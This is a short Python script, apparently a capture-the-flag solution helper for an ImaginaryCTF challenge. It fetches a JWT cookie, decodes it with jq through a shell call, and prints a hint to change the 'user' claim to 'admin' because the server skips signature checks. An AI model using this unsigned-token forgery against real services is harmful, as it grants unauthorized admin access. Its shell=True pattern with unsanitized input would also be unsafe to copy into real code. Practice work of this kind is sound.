import requests
import os
import subprocess

url = "http://puzzler7.imaginaryctf.org:11002/flag"
session = requests.Session()
r = session.get(url)
orginal_token = session.cookies.get_dict()
token_value = orginal_token.get('token')
print("Orginal Token: "+token_value)
decode_jwt = f'echo "{token_value}" | jq -R \'split(".") | .[0],.[1] | @base64d | fromjson\''
result = subprocess.check_output(decode_jwt, shell=True, universal_newlines=True)
print("\nOriginal Token Decoded: "+result)
print("\nYou can changed the payload 'user' to 'admin' to get flag and don't have to worry about signature verify since server don't check it ")
